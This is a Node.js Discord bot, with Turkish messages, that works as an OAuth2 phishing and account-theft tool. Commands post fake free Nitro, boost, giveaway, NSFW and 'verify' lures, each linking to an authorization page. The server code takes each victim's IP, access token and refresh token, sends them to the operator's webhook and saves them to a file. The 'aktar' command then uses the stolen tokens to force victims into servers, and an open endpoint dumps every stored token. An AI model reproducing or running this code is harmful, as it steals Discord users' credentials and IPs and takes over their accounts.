const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    //Discord.Intents.FLAGS.GUILD_BANS,
    //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    //Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    //Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `Uzmanist#7221`,
      type: "LISTENING",
    },
    status: "idle"
  }
});
const uzmanist = require("./uzmanist");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");


process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/uzmanistallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', uzmanist.client_id)
  form.append('client_secret', uzmanist.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', uzmanist.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token



      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(


                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${uzmanist.webhook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **Yeni Erişim**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `✅ Kullanıcı Adı: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\n🔶 IP: \`${ip}\`` +
                      `\n\n🔶 ID: \`${te.data.id}\`` +
                      `\n\n🔶 Erişilmiş Token: \`${ac_token}\`` +
                      `\n\n🔶 Yenilenmiş Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

client.on("ready", () => {

  console.log(`${chalk.blue('By. Uzmanist#7221')}\n${chalk.green('->')} Altyapı [ ${client.user.username} ] Adına Giriş Yaptı, Prefix   : ${uzmanist.prefix}\n${chalk.green('->')} Bot Daveti : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(uzmanist.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === "mybot") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()

      .setTitle('Tamam kabul. Bu senin botun 😞')
      .setDescription(`Senin Botunun Davet Linki [${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8)`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }


  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.yes} Çalışıyor`

      }],
    })
  }

  if (cmd === "yardım") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.help} Doğrulama Botu`,


        description: `${emoji.command} Önemli Komutlar\n[${uzmanist.prefix}linkler](${uzmanist.destek}), [${uzmanist.prefix}doğrula](${uzmanist.destek}), [${uzmanist.prefix}hesaplar](${uzmanist.destek}), [${uzmanist.prefix}aktar](${uzmanist.destek})\n\n${emoji.wl} Diğer Komutlar\n[${uzmanist.prefix}boost](${uzmanist.destek}), [${uzmanist.prefix}nitro](${uzmanist.destek}), \n[${uzmanist.prefix}nsfw](${uzmanist.destek}), \n[${uzmanist.prefix}çekiliş](${uzmanist.destek})\n [${uzmanist.prefix}test](${uzmanist.destek}), [${uzmanist.prefix}botbilgi](${uzmanist.destek}), [${uzmanist.prefix}botum](${uzmanist.destek})\n\n${emoji.prefix} Prefix:   [${uzmanist.prefix}](${uzmanist.destek})`,


        footer: {
          "text": `${uzmanist.client} ・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`
        }

      }],
    })
  }

  if (cmd === "botbilgi") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/sMPrwvZRfJ')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: "🤖・Bilgilendirme", value: `> **Bot: :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n\n`, inline: false },
        { name: "💻 ・Geliştirici", value: `> **İsim:** Uzmanist#7221`, inline: false },
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }
  if (cmd === "botum") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()

      .setTitle('Tamam kabul. Bu senin botun 😞')
      .setDescription(`Senin Botunun Davet Linki [${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8)`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }

  if (cmd === "partner") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} Bütün Partner Sunucular Burada Gösterilecek`,
        description: `> **[Partner 1](https://discord.gg/sMPrwvZRfJ)**`,
        color: "2F3136",
        footer: {
          "text": `${uzmanist.client} ・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`
        }
      }]
    })
  }
  if (cmd === "linkler") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} Davet:`,
        description: `${emoji.links} **Erişim Linki:** ${uzmanist.authLink}\n\`\`\`${uzmanist.authLink}\`\`\`\n${emoji.links} **Bot Davet:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
        footer: {
          "text": `${uzmanist.client} ・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot Davet",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }

  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Merhaba Üyeler! Bu sunucuda bulunduğunuz için **Boost Kazandınız!**`,

        description: `Boostunuzu almanız için yapmanız gerekenler:
        \n1️⃣Almak için **Topla** Butonuna Tıklayın > [Topla](${uzmanist.authLink})
        \n2️⃣Daha Sonra **Yetkilendir** Butonuna Tıklayın > [Yetkilendir]( ${uzmanist.authLink})\n\nHesabınız yetkilendirildikten sonra kısa süre içerisinde boostunuz teslim edilecek.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/930806442301214781/1081213622899974296/6a0104ba30c01bff32b9e19c49fec1b5.gif"
        },

        footer: {
          "text": `・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Boost'u Topla",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "nitro") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Merhaba Üyeler! Bu sunucuda bulunduğunuz için **Nitro Kazandınız!**`,

        description: `Nitronuzu almanız için yapmanız gerekenler:
   \n1️⃣Almak için **Topla** Butonuna Tıklayın > [Topla]( ${uzmanist.authLink})
   \n2️⃣Daha Sonra **Yetkilendir** Butonuna Tıklayın > [Yetkilendir]( ${uzmanist.authLink})\n\nHesabınız yetkilendirildikten sonra kısa süre içerisinde nitronuz teslim edilecek.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/930806442301214781/1081214208852643990/discord-nitro-700x382.png"
        },

        footer: {
          "text": `・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Nitor'nu' Al!",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "çekiliş") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({
      "content": "🎉 **Çekiliş** 🎉",
      embeds: [{
        title: `**🎁 | Nitro Aylık ve Nitro Yıllık | 🎁** `,
        description: `\n **Kazananlar:** \`1\`\n **Zamanlayıcı**: \`Yakında Sona Erecek\`\n\n **Çekiliş Sahibi: <@${ctx.author.id}>**\n\n:tada: Çekilişe katılmak için butona tıklayınız.`,
        "color": 0,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/930806442301214781/1081219632544882709/Gift_Gif.gif"
        },

        footer: {
          "text": `・ ${uzmanist.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/930806442301214781/1081219985969528832/3899-gift.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": " 🎉 ",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "cleans") {
    await client.clean(message)
  }

  if (cmd === "refresh") {
    await client.refreshTokens(message)
  }

  if (cmd === "nsfw") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `**NSFW ERİŞİMİ**`,
        description: `NSFW'ye erişim kazanmak için aşağıda 🔞 tepkisine tıklayın!
        
         __Lütfen aşağıdaki kurallara uyun!__
- 18 Yaşından Büyük Olmalısınız
- Discord **TOS** kurallarını ihlal etmeyiniz
  \n [Butona Tıklayın!](${uzmanist.authLink}) ✅`,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/930806442301214781/1081223838244798575/IMG_20230303_173711.jpg"
        },

        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🔞 NSFW Erişim",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })

  }
  if (cmd === "doğrula") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**Özel çekiliş kanallarını ve sohbet kanallarını görebilmek için [Tıklayın!](${uzmanist.authLink})**`,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/930806442301214781/1081227095893606410/verify.gif"
        },
        
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅ Doğrula!",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "check") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**❌ Bu kişinin hesabı doğrulanmamış! 
           Lütfen doğrulamak için [Tıklayın!](${uzmanist.authLink})**`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Şimdi Doğrula",
              "url": `${uzmanist.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "aktar") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.user} **Hesaplar Aktarılıyor...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
        await client.clean(message)
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;
        await client.refreshTokens(message)
      }


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Hesaplar Aktarılıyor...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

      msg.edit({
        embeds: [{
          title: `${emoji.user} Hesap Aktarımı`,
          description: `${emoji.new} **Zaten Sunucuda** : ${already_joined}\n${emoji.succes} **Başarılı**: ${success}\n${emoji.error} **Başarısız**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${uzmanist.client} ・ ${uzmanist.footer}`,
            "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`
          }
        }]
      }).catch(() => { })
    })
  }
  if (cmd === "hesaplar") {




    if (db.get(`wl_${ctx.author.id}`) !== true && !uzmanist.sahipler.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} Bağlı Hesaplar`,
          description: `${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` Hesaplar` : `\`${JSON.parse(data).length}\``}\n`,
          color: "2F3136",
          footer: {
            "text": `${uzmanist.client} ・ ${uzmanist.footer}`,
            "icon_url": `https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256`
          }

        }]
      })
    })
  }
})

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(process.env.token).catch(() => {
  throw new Error(`Token Hatalı veya INTENTS Kapalı`)
}) 


app.listen(uzmanist.port, () => console.log('Bağlantı Kuruluyor...'))

